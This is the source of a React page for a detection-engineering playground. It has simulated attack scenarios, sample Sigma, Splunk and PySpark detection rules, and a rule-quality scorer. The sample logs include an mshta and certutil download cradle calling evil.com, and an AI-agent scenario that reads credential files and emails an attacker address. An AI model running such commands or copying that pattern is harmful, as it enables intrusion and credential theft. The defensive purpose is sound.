"use client";

import { useState, useEffect } from "react";
import dynamic from "next/dynamic";
import { PageHeader } from "@/components/PageHeader";
import { Play, RefreshCw, Terminal, FileText, CheckCircle2, AlertTriangle, ChevronDown, Shuffle, Star, TrendingUp, TrendingDown, Minus } from "lucide-react";

const MonacoEditor = dynamic(() => import("@monaco-editor/react"), { ssr: false });

type Scenario = "exfiltration" | "login-anomaly" | "agent-misuse" | "cloud-audit" | "endpoint-execution";

const scenarioLanguage: Record<Scenario, string> = {
  exfiltration:       "python",
  "login-anomaly":    "yaml",
  "agent-misuse":     "javascript",
  "cloud-audit":      "plaintext",
  "endpoint-execution": "yaml",
};

const scenarios: { id: Scenario; label: string; description: string }[] = [
  { id: "exfiltration", label: "Data Exfiltration", description: "Large volume data transfer to external IP" },
  { id: "login-anomaly", label: "Login Anomaly", description: "Impossible travel & MFA fatigue pattern" },
  { id: "agent-misuse", label: "Agent Misuse", description: "AI agent accessing out-of-scope resources" },
  { id: "cloud-audit", label: "Cloud Audit Trail", description: "AWS IAM privilege escalation sequence" },
  { id: "endpoint-execution", label: "Endpoint Execution", description: "LOLBin execution chain on Windows host" },
];

const sampleQueries: Record<Scenario, string> = {
  exfiltration: `-- Detection: Data Exfiltration via Large File Transfer
-- Scenario: User transferred 2.3 GB to an external IP within 5 minutes
-- Platform : PySpark + Spark SQL
-- Severity : Critical

spark.sql("""
    SELECT
        src_ip,
        dest_ip,
        user,
        SUM(bytes_out)                              AS total_bytes,
        ROUND(SUM(bytes_out) / 1073741824.0, 2)    AS gb_out,
        COUNT(*)                                    AS connection_count,
        MIN(timestamp)                              AS first_seen,
        MAX(timestamp)                              AS last_seen
    FROM network_firewall_logs
    WHERE
        -- Exclude RFC-1918 private ranges (always approved egress)
        dest_ip NOT LIKE '10.%'
        AND dest_ip NOT LIKE '192.168.%'
        AND dest_ip NOT LIKE '172.16.%'
        AND dest_ip NOT LIKE '172.17.%'
        AND dest_ip NOT LIKE '172.18.%'
        AND dest_ip NOT LIKE '172.19.%'
        AND dest_ip NOT LIKE '172.2%.%'
        AND dest_ip NOT LIKE '172.30.%'
        AND dest_ip NOT LIKE '172.31.%'
        AND dest_ip NOT LIKE '127.%'
        -- Only examine significant individual flows
        AND bytes_out > 10000000
        -- Rolling 10-minute window (partition by session if available)
        AND timestamp >= NOW() - INTERVAL 10 MINUTES
    GROUP BY
        src_ip,
        dest_ip,
        user
    HAVING
        -- Alert when aggregate outbound exceeds 500 MB in the window
        SUM(bytes_out) > 524288000
    ORDER BY
        total_bytes DESC
""")`,

  "login-anomaly": `// Detection: Impossible Travel + MFA Fatigue
// Scenario: Auth from NY then London within 90 minutes + 12 MFA denials

// Sigma YAML:
title: Impossible Travel Authentication
id: play-002
status: experimental
description: Detects logins from geographically impossible locations
logsource:
  category: authentication
  product: idp
detection:
  selection:
    event_type: 'login_success'
  condition: selection
  timeframe: 2h
  # Post-processing: calculate distance between consecutive auth events
  # Alert if distance / time_delta_hours > 800 km/h (impossible travel)

---
// MFA Fatigue companion rule:
title: MFA Prompt Flooding
detection:
  selection:
    event_type: 'mfa_denied'
  aggregate:
    count() > 5
    groupby: user_id
    timeframe: 10m
  condition: selection | count > 5`,

  "agent-misuse": `// Detection: AI Agent Out-of-Scope Resource Access
// Scenario: Agent task = "summarize Q4 reports"
//           Agent actually accessed: /etc/shadow, AWS credentials, email inbox

// Tool call sequence analysis:
const expectedToolScope = [
  "read_file",      // Expected
  "search_docs",    // Expected
  "write_summary",  // Expected
];

const actualToolCalls = [
  { tool: "read_file", path: "/reports/Q4_2024.pdf", timestamp: "T+0s" },
  { tool: "read_file", path: "/reports/Q3_2024.pdf", timestamp: "T+2s" },
  { tool: "read_file", path: "/etc/passwd",          timestamp: "T+45s" },  // ANOMALY
  { tool: "read_file", path: "~/.aws/credentials",   timestamp: "T+47s" },  // ANOMALY
  { tool: "send_email", to: "external@attacker.com", timestamp: "T+50s" },  // ALERT
];

// Detection logic: flag paths outside declared task scope
const alertPaths = ["/etc/", "~/.aws/", "~/.ssh/", "~/.config/"];
const suspicious = actualToolCalls.filter(call =>
  alertPaths.some(p => (call.path || "").startsWith(p))
);
console.log("Suspicious tool calls:", suspicious);`,

  "cloud-audit": `# Detection: AWS IAM Privilege Escalation Sequence
# Scenario: AttachRolePolicy(AdministratorAccess) followed by AssumeRole

# CloudTrail sequence to detect:
# 1. CreateRole or ListRoles  (reconnaissance)
# 2. AttachRolePolicy with overpermissive policy  (privilege assignment)
# 3. AssumeRole into new role  (privilege use)
# All within 30 minutes, by same user

# Splunk SPL:
index=aws sourcetype=aws:cloudtrail
  userIdentity.type="IAMUser"
| transaction userIdentity.arn maxspan=30m
| where eventcount > 2
| eval events = mvjoin(eventName, ",")
| where match(events, "AttachRolePolicy") AND match(events, "AssumeRole")
| eval policy_check = if(match(events, "AdministratorAccess"), "CRITICAL", "REVIEW")
| table _time, userIdentity.arn, events, policy_check, sourceIPAddress

# Sigma rule would target:
# logsource: product=aws, service=cloudtrail
# detection: sequence of AttachRolePolicy → AssumeRole within 30min window`,

  "endpoint-execution": `// Detection: LOLBin Execution Chain
// Scenario: cmd.exe → mshta.exe → powershell.exe (encoded) → certutil.exe (download)

// Process tree:
// explorer.exe (PID 1234)
//   └─ cmd.exe /c mshta.exe javascript:... (PID 5678) ← Initial execution
//        └─ powershell.exe -enc JABjA... (PID 9012)  ← Encoded PS
//             └─ certutil.exe -urlcache -split -f     ← Download cradle

// Sigma detection:
title: LOLBin Execution Chain - certutil Download
logsource:
  category: process_creation
  product: windows
detection:
  selection_certutil:
    Image|endswith: '\\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-split'
  ancestor_powershell:
    ParentImage|endswith: '\\powershell.exe'
  grandparent_cmd:
    # Sysmon process ancestry requires correlation
    CommandLine|contains: '-enc'
  condition: selection_certutil AND ancestor_powershell
level: critical`,
};

const sampleLogs: Record<Scenario, string[]> = {
  exfiltration: [
    '{"timestamp":"2024-12-01T02:15:33Z","src_ip":"192.168.1.105","dest_ip":"185.220.101.42","user":"jsmith","bytes_out":2457862144,"protocol":"HTTPS","dest_port":443}',
    '{"timestamp":"2024-12-01T02:18:11Z","src_ip":"192.168.1.105","dest_ip":"185.220.101.42","user":"jsmith","bytes_out":891289600,"protocol":"HTTPS","dest_port":443}',
  ],
  "login-anomaly": [
    '{"timestamp":"2024-12-01T08:00:00Z","event":"login_success","user":"alice@corp.com","ip":"74.125.224.72","geo_city":"New York","geo_country":"US"}',
    '{"timestamp":"2024-12-01T09:28:00Z","event":"login_success","user":"alice@corp.com","ip":"2.56.9.100","geo_city":"London","geo_country":"GB"}',
    '{"timestamp":"2024-12-01T09:30:00Z","event":"mfa_denied","user":"alice@corp.com","ip":"2.56.9.100"}',
    '{"timestamp":"2024-12-01T09:30:45Z","event":"mfa_denied","user":"alice@corp.com","ip":"2.56.9.100"}',
    '{"timestamp":"2024-12-01T09:32:10Z","event":"mfa_denied","user":"alice@corp.com","ip":"2.56.9.100"}',
  ],
  "agent-misuse": [
    '{"timestamp":"T+45s","agent_id":"agent-0x4f2","tool":"read_file","path":"/etc/passwd","task_id":"task-summarize-q4"}',
    '{"timestamp":"T+47s","agent_id":"agent-0x4f2","tool":"read_file","path":"/root/.aws/credentials","task_id":"task-summarize-q4"}',
    '{"timestamp":"T+50s","agent_id":"agent-0x4f2","tool":"send_email","to":"external@gmail.com","subject":"report","task_id":"task-summarize-q4"}',
  ],
  "cloud-audit": [
    '{"eventTime":"2024-12-01T14:00:00Z","eventName":"ListRoles","userIdentity":{"arn":"arn:aws:iam::123:user/dev-user"},"sourceIPAddress":"34.218.0.0"}',
    '{"eventTime":"2024-12-01T14:12:00Z","eventName":"AttachRolePolicy","requestParameters":{"policyArn":"arn:aws:iam::aws:policy/AdministratorAccess","roleName":"DevOps"},"userIdentity":{"arn":"arn:aws:iam::123:user/dev-user"}}',
    '{"eventTime":"2024-12-01T14:15:00Z","eventName":"AssumeRole","requestParameters":{"roleArn":"arn:aws:iam::123:role/DevOps"},"userIdentity":{"arn":"arn:aws:iam::123:user/dev-user"}}',
  ],
  "endpoint-execution": [
    '{"EventID":4688,"Computer":"CORP-WS01","SubjectUserName":"jdoe","ParentProcessName":"C:\\Windows\\System32\\cmd.exe","NewProcessName":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe javascript:a=(GetObject(\'script:http://evil.com/a.sct\')).Exec();close();"}',
    '{"EventID":4688,"Computer":"CORP-WS01","SubjectUserName":"jdoe","ParentProcessName":"C:\\Windows\\System32\\mshta.exe","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -enc JABjAGwAaQBlAG4AdA=="}',
    '{"EventID":4688,"Computer":"CORP-WS01","SubjectUserName":"jdoe","ParentProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","NewProcessName":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\a.exe"}',
  ],
};

type SimResult = { match: boolean; confidence: string; explanation: string; events: number };

function simulate(scenario: Scenario, query: string): SimResult {
  const logs = sampleLogs[scenario];
  const hasQuery = query.trim().length > 10;

  const results: Record<Scenario, SimResult> = {
    exfiltration: {
      match: true,
      confidence: "High",
      explanation: "2 events matched. Total egress volume: 3.31 GB to external IP 185.220.101.42 within 3 minutes. Destination is Tor exit node. Rule fired on bytes_out threshold.",
      events: 2,
    },
    "login-anomaly": {
      match: true,
      confidence: "High",
      explanation: "Impossible travel detected: New York → London in 88 minutes (requires ~900 km/h). Combined with 3+ MFA denials within 3 minutes. Correlation score: 0.94.",
      events: 5,
    },
    "agent-misuse": {
      match: true,
      confidence: "Critical",
      explanation: "AI agent (agent-0x4f2) accessed /etc/passwd and ~/.aws/credentials, both outside declared task scope. Followed by email to external address within 50 seconds of first anomaly.",
      events: 3,
    },
    "cloud-audit": {
      match: true,
      confidence: "High",
      explanation: "IAM escalation chain: ListRoles → AttachRolePolicy(AdministratorAccess) → AssumeRole, all within 15 minutes by dev-user. New access pattern from IP 34.218.0.0.",
      events: 3,
    },
    "endpoint-execution": {
      match: true,
      confidence: "Critical",
      explanation: "LOLBin execution chain confirmed: cmd → mshta(javascript) → powershell(encoded) → certutil(urlcache). Process tree spans 3 generations. Certutil downloading from http://evil.com, matches known malware IOC.",
      events: 3,
    },
  };

  return hasQuery ? results[scenario] : { match: false, confidence: "N/A", explanation: "No query loaded. Enter a detection query and click Run.", events: 0 };
}

function generateDummyData(scenario: Scenario): string {
  const count = Math.floor(Math.random() * 3) + 2;
  return sampleLogs[scenario].slice(0, count).join("\n");
}

// --- Detection Quality Scoring ---

interface QualityScore {
  total: number;
  format: string;
  breakdown: { label: string; score: number; max: number; feedback: string }[];
  strengths: string[];
  improvements: string[];
}

type DetectionFormat = "sigma" | "splunk" | "pyspark" | "unknown";

function detectFormat(rule: string): DetectionFormat {
  if (/^title:/m.test(rule) && /logsource:/i.test(rule)) return "sigma";
  if (/^detection:/m.test(rule) || (/logsource:/i.test(rule) && /condition:/i.test(rule))) return "sigma";
  if (/index=\w|sourcetype=\w/.test(rule) || /^\|[ \t]*(stats|eval|where|table|transaction)\b/m.test(rule)) return "splunk";
  if (/from pyspark|spark\.sql|spark\.read|\.filter\(col\(/.test(rule)) return "pyspark";
  return "unknown";
}

function scoreDetection(rule: string): QualityScore {
  const format = detectFormat(rule);
  const breakdown: QualityScore["breakdown"] = [];
  const strengths: string[] = [];
  const improvements: string[] = [];

  // ── 1. Completeness (0-25) ── format-aware required fields ──────────────────
  let completeness = 0;

  if (format === "sigma") {
    if (/^title:/m.test(rule)) { completeness += 5; strengths.push("Rule has a title."); }
    else improvements.push("Add a title field for discoverability.");
    if (/^description:/m.test(rule)) completeness += 5;
    else improvements.push("Add a description explaining what the rule detects.");
    if (/^logsource:/m.test(rule)) { completeness += 7; strengths.push("Log source is defined."); }
    else improvements.push("Define a logsource block (category and product).");
    if (/^detection:/m.test(rule)) { completeness += 5; strengths.push("Detection logic is present."); }
    else improvements.push("Add a detection: block with selection criteria.");
    if (/^level:/m.test(rule)) completeness += 3;
    else improvements.push("Add a level field (low/medium/high/critical).");
  } else if (format === "splunk") {
    if (/index=\w|sourcetype=\w/.test(rule)) { completeness += 10; strengths.push("Index and sourcetype are specified."); }
    else improvements.push("Specify an index and sourcetype for the data source.");
    if (/\|\s*(where|search)\s/i.test(rule)) { completeness += 8; strengths.push("Filter conditions are present."); }
    else improvements.push("Add a | where or | search clause to filter events.");
    if (/\|\s*table\s/i.test(rule)) { completeness += 4; strengths.push("Output fields are specified with | table."); }
    else improvements.push("Add a | table clause to specify output fields.");
    if (/\|\s*comment\(/i.test(rule)) completeness += 3;
  } else if (format === "pyspark") {
    if (/spark\.sql|spark\.read|\.filter\(/.test(rule)) { completeness += 10; strengths.push("PySpark data source and filter are defined."); }
    else improvements.push("Include a spark.read or spark.sql data source.");
    if (/col\(/.test(rule)) { completeness += 8; strengths.push("Uses col() for type-safe field references."); }
    else improvements.push("Use col() references for specific fields.");
    if (/\.show\(|\.toPandas\(|\.write/.test(rule)) completeness += 4;
    if (/# |"""/.test(rule)) completeness += 3;
  } else {
    // Unknown format — generic checks
    if (/title:/i.test(rule)) { completeness += 5; strengths.push("Rule has a title."); }
    if (/index=|logsource:|filter\(/.test(rule)) { completeness += 10; strengths.push("Data source reference present."); }
    if (/where |detection:|\.filter\(/.test(rule)) { completeness += 7; strengths.push("Filter/detection logic present."); }
    if (/level:|severity:/i.test(rule)) completeness += 3;
  }
  breakdown.push({ label: "Completeness", score: completeness, max: 25, feedback: "Checks required fields for this format." });

  // ── 2. Logic Clarity (0-20) ──────────────────────────────────────────────────
  let clarity = 0;
  const wildcards = (rule.match(/\*/g) || []).length;

  if (format === "sigma") {
    const fieldCount = (rule.match(/^\s{4,}\w[\w.]+(?:\|\w+)*:/gm) || []).length;
    if (fieldCount >= 2) { clarity += 10; strengths.push("Uses specific field references."); }
    else improvements.push("Add more specific field conditions to the detection block.");
    if (wildcards < 5) clarity += 5;
    if (/condition:/i.test(rule)) { clarity += 5; strengths.push("Condition logic is explicit."); }
  } else if (format === "splunk") {
    const fieldConditions = (rule.match(/\b\w[\w.]+\s*(?:=|!=|>|<)\s*["'*\w]/g) || []).length;
    if (fieldConditions >= 2) { clarity += 10; strengths.push("Uses specific field=value comparisons."); }
    else improvements.push("Add explicit field comparisons instead of broad wildcards.");
    if (wildcards < 6) clarity += 5;
    if (/\|\s*(stats|transaction|eval)\s/i.test(rule)) { clarity += 5; strengths.push("Aggregation or correlation logic is present."); }
  } else if (format === "pyspark") {
    const colRefs = (rule.match(/col\(["']\w/g) || []).length;
    if (colRefs >= 2) { clarity += 10; strengths.push("Uses named col() field references."); }
    else improvements.push("Use col('field_name') for explicit field references.");
    if (wildcards < 4) clarity += 5;
    if (/groupBy|agg\(|orderBy/.test(rule)) { clarity += 5; strengths.push("Aggregation logic is present."); }
  } else {
    const fieldRefs = (rule.match(/col\(|commandline|image|eventname|sourcetype/gi) || []).length;
    if (fieldRefs > 2) { clarity += 10; strengths.push("Uses specific field references."); }
    else improvements.push("Use named fields instead of broad wildcards.");
    if (wildcards < 5) clarity += 5;
    if (/condition:|\.filter\(|where /i.test(rule)) clarity += 5;
  }
  breakdown.push({ label: "Logic Clarity", score: clarity, max: 20, feedback: "Evaluates field specificity and condition structure." });

  // ── 3. Noise Reduction (0-20) ────────────────────────────────────────────────
  let filtering = 0;

  const hasExclusion =
    /filter:|NOT |not filter|\.filter\(~|where.*not\b|\bNOT\b/i.test(rule) ||
    /allowlist|whitelist|exclude/i.test(rule);

  if (hasExclusion) {
    filtering += 10; strengths.push("Includes exclusion/filter logic to reduce noise.");
  } else {
    improvements.push("Add exclusion filters for known-good activity to reduce false positives.");
  }

  if (format === "sigma") {
    if (/^falsepositives:/m.test(rule)) { filtering += 5; strengths.push("False positives are documented."); }
    else improvements.push("Document expected false positives in a falsepositives: block.");
  } else {
    if (/false.positive|fp:|# fp/i.test(rule)) { filtering += 5; strengths.push("False positives are documented."); }
    else improvements.push("Document expected false positives in comments.");
  }

  if (/threshold|count.*>|> \d+|\.\s*filter.*count/i.test(rule)) {
    filtering += 5; strengths.push("Threshold-based filtering applied.");
  }
  breakdown.push({ label: "Noise Reduction", score: filtering, max: 20, feedback: "Assesses exclusions and false positive documentation." });

  // ── 4. Best Practices (0-20) ─────────────────────────────────────────────────
  let bestPractice = 0;

  if (format === "sigma") {
    if (/^id:/m.test(rule)) bestPractice += 4;
    else improvements.push("Add a unique rule ID (UUID or slug).");
    if (/^tags:/m.test(rule) || /t1\d{3}/i.test(rule)) { bestPractice += 6; strengths.push("MITRE ATT&CK tags are present."); }
    else improvements.push("Map to MITRE ATT&CK technique IDs in the tags: block.");
    if (/^author:/m.test(rule)) bestPractice += 4;
    else improvements.push("Add an author field for attribution.");
    if (/^date:/m.test(rule) || /^modified:/m.test(rule)) bestPractice += 3;
    if (/^references?:/m.test(rule)) { bestPractice += 3; strengths.push("References included."); }
  } else {
    // Non-Sigma: check for comments with equivalent metadata
    if (/# detection:|\/\/ detection:|comment\(/i.test(rule)) { bestPractice += 4; }
    else improvements.push("Add a comment header identifying this rule (name, author, purpose).");
    if (/t1\d{3}|mitre/i.test(rule)) { bestPractice += 6; strengths.push("MITRE ATT&CK reference present."); }
    else improvements.push("Reference the relevant MITRE ATT&CK technique ID in a comment.");
    if (/author:|# by |\/\/ by /i.test(rule)) bestPractice += 4;
    else improvements.push("Add an author comment for attribution.");
    if (/\d{4}[-/]\d{2}[-/]\d{2}/.test(rule)) bestPractice += 3;
    if (/https?:\/\//.test(rule)) { bestPractice += 3; strengths.push("External references included."); }
  }
  breakdown.push({ label: "Best Practices", score: bestPractice, max: 20, feedback: "Checks IDs, MITRE mapping, attribution, references." });

  // ── 5. Operability (0-15) ────────────────────────────────────────────────────
  let operability = 0;

  if (format === "sigma") {
    if (/logsource:/i.test(rule)) { operability += 5; strengths.push("Logsource context aids deployment."); }
    if (/^status:/m.test(rule)) operability += 3;
    else improvements.push("Set a status field (experimental/stable/production).");
    if (/tuning|filter:|exclude/i.test(rule)) { operability += 4; }
    if (/timeframe:/i.test(rule)) { operability += 3; strengths.push("Time window is defined."); }
  } else if (format === "splunk") {
    if (/index=\w/.test(rule)) { operability += 5; strengths.push("Index is specified for deployment."); }
    if (/\|\s*sort\s/i.test(rule)) operability += 3;
    if (/earliest=|latest=|span=/i.test(rule)) { operability += 4; strengths.push("Time bounds are defined."); }
    else improvements.push("Add time bounds (earliest=/latest= or span=) for scheduled alerting.");
    if (/\|\s*alert\b|\|\s*sendalert/i.test(rule)) operability += 3;
  } else if (format === "pyspark") {
    if (/spark\.read|\.load\(/.test(rule)) { operability += 5; strengths.push("Data read path is defined."); }
    if (/\.write|\.save/.test(rule)) operability += 3;
    if (/\d{4}-\d{2}-\d{2}|start_date|end_date/i.test(rule)) { operability += 4; strengths.push("Date range is parameterized."); }
    else improvements.push("Parameterize the date range for scheduled execution.");
    if (/SparkSession|spark = /.test(rule)) operability += 3;
  } else {
    if (/deployment|logsource|index=/i.test(rule)) { operability += 5; }
    else improvements.push("Add deployment context for operators.");
    if (/tuning|whitelist|allowlist|exclude/i.test(rule)) operability += 5;
  }
  breakdown.push({ label: "Operability", score: operability, max: 15, feedback: "Checks deployment guidance and scheduling context." });

  const total = completeness + clarity + filtering + bestPractice + operability;

  const uniqueStrengths = Array.from(new Set(strengths)).slice(0, 4);
  const uniqueImprovements = Array.from(new Set(improvements)).slice(0, 4);

  const formatLabel =
    format === "sigma" ? "Sigma YAML" :
    format === "splunk" ? "Splunk SPL" :
    format === "pyspark" ? "PySpark" : "Unknown format";

  return { total, format: formatLabel, breakdown, strengths: uniqueStrengths, improvements: uniqueImprovements };
}

const QUALITY_PLACEHOLDER = `# Paste any detection rule here to evaluate its quality.
# Supports Sigma YAML, Splunk SPL, PySpark, or any format.

title: Example Detection Rule
id: eval-001
status: experimental
description: Detects suspicious process creation
author: analyst@company.com
date: 2024/12/10
tags:
  - attack.execution
  - attack.t1059
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\cmd.exe'
    CommandLine|contains: '/c whoami'
  filter:
    ParentImage|startswith: 'C:\\Windows\\System32\\'
  condition: selection and not filter
falsepositives:
  - Legitimate IT admin tools
level: medium`;

export default function PlaygroundPage() {
  const [scenario, setScenario] = useState<Scenario>("exfiltration");
  const [query, setQuery] = useState(sampleQueries.exfiltration);
  const [logs, setLogs] = useState(sampleLogs.exfiltration.join("\n"));
  const [result, setResult] = useState<SimResult | null>(null);
  const [running, setRunning] = useState(false);

  useEffect(() => { document.title = "Playground | AIDetectLab"; }, []);

  // Quality scorer
  const [qualityRule, setQualityRule] = useState(QUALITY_PLACEHOLDER);
  const [qualityResult, setQualityResult] = useState<QualityScore | null>(null);
  const [evaluating, setEvaluating] = useState(false);

  const handleScenarioChange = (s: Scenario) => {
    setScenario(s);
    setQuery(sampleQueries[s]);
    setLogs(sampleLogs[s].join("\n"));
    setResult(null);
  };

  const handleRun = async () => {
    setRunning(true);
    await new Promise((r) => setTimeout(r, 800));
    setResult(simulate(scenario, query));
    setRunning(false);
  };

  const handleGenerate = () => {
    setLogs(generateDummyData(scenario));
    setResult(null);
  };

  const handleEvaluate = async () => {
    setEvaluating(true);
    await new Promise((r) => setTimeout(r, 600));
    setQualityResult(scoreDetection(qualityRule));
    setEvaluating(false);
  };

  return (
    <div className="pt-14 min-h-screen">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
        <div className="flex items-start justify-between mb-6">
          <PageHeader
            eyebrow="Playground"
            title="Detection Workbench"
            description="Write, test, and validate detections against simulated attack scenarios."
            className="mb-0"
            accent="yellow"
          />
        </div>

        {/* Scenario Selector */}
        <div className="flex flex-wrap gap-2 mb-6">
          {scenarios.map((s) => (
            <button
              key={s.id}
              onClick={() => handleScenarioChange(s.id)}
              className={`flex items-center gap-2 px-3 py-2 rounded-lg border text-xs font-medium transition-all ${
                scenario === s.id
                  ? "bg-cyan-500/10 border-cyan-500/30 text-cyan-400"
                  : "bg-white/[0.03] border-white/[0.08] text-gray-500 hover:text-gray-300 hover:border-white/15"
              }`}
            >
              <span>{s.label}</span>
            </button>
          ))}
        </div>

        <div className="mb-3 card-surface p-3 text-xs text-gray-500 flex items-start gap-2">
          <FileText className="w-3.5 h-3.5 text-gray-600 flex-shrink-0 mt-0.5" />
          <span>{scenarios.find((s) => s.id === scenario)?.description}</span>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-4">
          {/* Query Editor */}
          <div className="card-surface overflow-hidden">
            <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.06]">
              <div className="flex items-center gap-2">
                <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                <span className="text-xs font-medium text-gray-400">Detection Query</span>
              </div>
              <button
                onClick={handleRun}
                disabled={running}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-md bg-cyan-500 hover:bg-cyan-400 disabled:opacity-50 text-white text-xs font-medium transition-all"
              >
                {running ? (
                  <RefreshCw className="w-3 h-3 animate-spin" />
                ) : (
                  <Play className="w-3 h-3" />
                )}
                {running ? "Running..." : "Run"}
              </button>
            </div>
            <div className="h-[360px]">
              <MonacoEditor
                height="100%"
                language={scenarioLanguage[scenario]}
                value={query}
                onChange={(v) => setQuery(v || "")}
                theme="vs-dark"
                options={{
                  fontSize: 11,
                  minimap: { enabled: false },
                  scrollBeyondLastLine: false,
                  lineNumbers: "on",
                  renderLineHighlight: "none",
                  padding: { top: 12, bottom: 12 },
                  fontFamily: "'JetBrains Mono', monospace",
                }}
              />
            </div>
          </div>

          {/* Log Panel */}
          <div className="card-surface overflow-hidden">
            <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.06]">
              <div className="flex items-center gap-2">
                <FileText className="w-3.5 h-3.5 text-gray-400" />
                <span className="text-xs font-medium text-gray-400">Log Events</span>
              </div>
              <button
                onClick={handleGenerate}
                className="flex items-center gap-1 px-2 py-1 rounded text-xs text-gray-500 hover:text-white hover:bg-white/5 transition-all"
              >
                <Shuffle className="w-3 h-3" />
                Generate
              </button>
            </div>
            <div className="h-[360px]">
              <MonacoEditor
                height="100%"
                language="json"
                value={logs}
                onChange={(v) => setLogs(v || "")}
                theme="vs-dark"
                options={{
                  fontSize: 11,
                  minimap: { enabled: false },
                  scrollBeyondLastLine: false,
                  lineNumbers: "on",
                  renderLineHighlight: "none",
                  padding: { top: 12, bottom: 12 },
                  fontFamily: "'JetBrains Mono', monospace",
                }}
              />
            </div>
          </div>
        </div>

        {/* Results */}
        {result && (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
            <div className={`card-surface p-5 ${result.match ? "border-emerald-500/20" : "border-white/[0.06]"}`}>
              <div className="flex items-center gap-2 mb-3">
                {result.match ? (
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                ) : (
                  <AlertTriangle className="w-4 h-4 text-gray-500" />
                )}
                <h3 className="text-sm font-semibold text-white">Detection Result</h3>
              </div>
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs text-gray-500">Status</span>
                  <span className={`text-xs font-medium ${result.match ? "text-emerald-400" : "text-gray-500"}`}>
                    {result.match ? "MATCH" : "NO MATCH"}
                  </span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs text-gray-500">Confidence</span>
                  <span className={`text-xs font-medium ${
                    result.confidence === "Critical" ? "text-red-400" :
                    result.confidence === "High" ? "text-orange-400" : "text-gray-500"
                  }`}>
                    {result.confidence}
                  </span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs text-gray-500">Events matched</span>
                  <span className="text-xs font-medium text-white">{result.events}</span>
                </div>
              </div>
            </div>
            <div className="lg:col-span-2 card-surface p-5">
              <h3 className="text-sm font-semibold text-white mb-3">Explanation</h3>
              <p className="text-xs text-gray-400 leading-relaxed">{result.explanation}</p>
            </div>
          </div>
        )}

        {/* Detection Quality Scorer */}
        <div className="mt-12 border-t border-white/[0.04] pt-10">
          <div className="flex items-center gap-2 mb-2">
            <Star className="w-4 h-4 text-yellow-400" />
            <h2 className="text-base font-semibold text-white">Detection Quality Scorer</h2>
          </div>
          <p className="text-xs text-gray-500 mb-6">
            Paste any detection rule below and evaluate its quality across completeness, logic clarity, noise reduction, best practices, and operability.
          </p>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-4">
            <div className="card-surface overflow-hidden">
              <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.06]">
                <div className="flex items-center gap-2">
                  <FileText className="w-3.5 h-3.5 text-yellow-400" />
                  <span className="text-xs font-medium text-gray-400">Paste Detection Rule</span>
                </div>
                <button
                  onClick={handleEvaluate}
                  disabled={evaluating}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-md bg-yellow-500/10 hover:bg-yellow-500/20 border border-yellow-500/20 text-yellow-400 text-xs font-medium transition-all disabled:opacity-50"
                >
                  {evaluating ? (
                    <RefreshCw className="w-3 h-3 animate-spin" />
                  ) : (
                    <Star className="w-3 h-3" />
                  )}
                  {evaluating ? "Evaluating..." : "Evaluate"}
                </button>
              </div>
              <div className="h-[320px]">
                <MonacoEditor
                  height="100%"
                  language="yaml"
                  value={qualityRule}
                  onChange={(v) => { setQualityRule(v || ""); setQualityResult(null); }}
                  theme="vs-dark"
                  options={{
                    fontSize: 11,
                    minimap: { enabled: false },
                    scrollBeyondLastLine: false,
                    lineNumbers: "on",
                    renderLineHighlight: "none",
                    padding: { top: 12, bottom: 12 },
                    fontFamily: "'JetBrains Mono', monospace",
                  }}
                />
              </div>
            </div>

            {/* Score output */}
            <div className="card-surface p-5 flex flex-col">
              {qualityResult ? (
                <>
                  {/* Score badge */}
                  <div className="flex items-center gap-4 mb-6">
                    <div className={`w-16 h-16 rounded-2xl flex items-center justify-center flex-shrink-0 ${
                      qualityResult.total >= 75 ? "bg-emerald-400/10 border border-emerald-400/20" :
                      qualityResult.total >= 50 ? "bg-yellow-400/10 border border-yellow-400/20" :
                      "bg-red-400/10 border border-red-400/20"
                    }`}>
                      <span className={`text-2xl font-bold ${
                        qualityResult.total >= 75 ? "text-emerald-400" :
                        qualityResult.total >= 50 ? "text-yellow-400" : "text-red-400"
                      }`}>
                        {qualityResult.total}
                      </span>
                    </div>
                    <div>
                      <p className="text-white font-semibold text-sm">
                        {qualityResult.total >= 75 ? "Good Rule" :
                         qualityResult.total >= 50 ? "Needs Improvement" : "Poor Quality"}
                      </p>
                      <p className="text-xs text-gray-500">out of 100 · <span className="text-gray-600">{qualityResult.format}</span></p>
                      <div className="mt-2 w-32 bg-white/[0.05] rounded-full h-1.5 overflow-hidden">
                        <div
                          className={`h-full rounded-full transition-all ${
                            qualityResult.total >= 75 ? "bg-emerald-400" :
                            qualityResult.total >= 50 ? "bg-yellow-400" : "bg-red-400"
                          }`}
                          style={{ width: `${qualityResult.total}%` }}
                        />
                      </div>
                    </div>
                  </div>

                  {/* Breakdown */}
                  <div className="space-y-2 mb-5">
                    {qualityResult.breakdown.map((item) => (
                      <div key={item.label}>
                        <div className="flex items-center justify-between mb-1">
                          <span className="text-xs text-gray-500">{item.label}</span>
                          <span className="text-xs text-gray-400">{item.score}/{item.max}</span>
                        </div>
                        <div className="w-full bg-white/[0.04] rounded-full h-1.5 overflow-hidden">
                          <div
                            className="h-full rounded-full bg-cyan-500/60"
                            style={{ width: `${(item.score / item.max) * 100}%` }}
                          />
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* Strengths & Improvements */}
